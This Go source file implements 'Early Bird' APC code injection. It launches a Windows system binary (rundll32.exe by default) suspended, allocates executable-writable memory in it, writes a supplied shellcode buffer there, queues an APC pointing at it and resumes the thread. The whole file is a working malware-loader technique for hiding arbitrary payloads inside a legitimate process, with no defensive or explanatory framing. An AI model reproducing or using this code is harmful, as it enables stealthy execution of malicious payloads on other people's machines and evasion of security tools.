package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

func doEarlyBirdInject(targetExe string, sc []byte) error {
	if targetExe == "" {
		targetExe = "rundll32.exe"
	}
	exePath := resolveSystem32Path(targetExe)

	type startupInfo struct {
		cb               uint32
		lpReserved       *uint16
		lpDesktop        *uint16
		lpTitle          *uint16
		dwX              uint32
		dwY              uint32
		dwXSize          uint32
		dwYSize          uint32
		dwXCountChars    uint32
		dwYCountChars    uint32
		dwFillAttribute  uint32
		dwFlags          uint32
		wShowWindow      uint16
		cbReserved2      uint16
		lpReserved2      *byte
		hStdInput        uintptr
		hStdOutput       uintptr
		hStdError        uintptr
	}

	type processInformation struct {
		hProcess    uintptr
		hThread     uintptr
		dwProcessID uint32
		dwThreadID  uint32
	}

	si := &startupInfo{cb: uint32(unsafe.Sizeof(startupInfo{}))}
	pi := &processInformation{}

	exePtr, _ := syscall.UTF16PtrFromString(exePath)
	cmdLine, _ := syscall.UTF16PtrFromString(exePath)

	ret, _, _ := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exePtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		0x00000004,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed")
	}
	defer procCloseHandle.Call(pi.hProcess)
	defer procCloseHandle.Call(pi.hThread)

	addr, _, _ := procVirtualAllocEx.Call(
		pi.hProcess, 0,
		uintptr(len(sc)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx in spawned process failed")
	}

	var written uintptr
	procWriteProcessMemory.Call(
		pi.hProcess, addr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
	)

	procQueueUserAPC.Call(addr, pi.hThread, 0)
	procResumeThread.Call(pi.hThread)

	return nil
}

func resolveSystem32Path(name string) string {
	envStr, _ := syscall.UTF16PtrFromString("%windir%\\system32\\" + name)
	var buf [260]uint16
	procExpandEnvironmentStringsW.Call(
		uintptr(unsafe.Pointer(envStr)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
	)
	res := syscall.UTF16ToString(buf[:])
	if res == "" {
		return "C:\\Windows\\system32\\" + name
	}
	return res
}
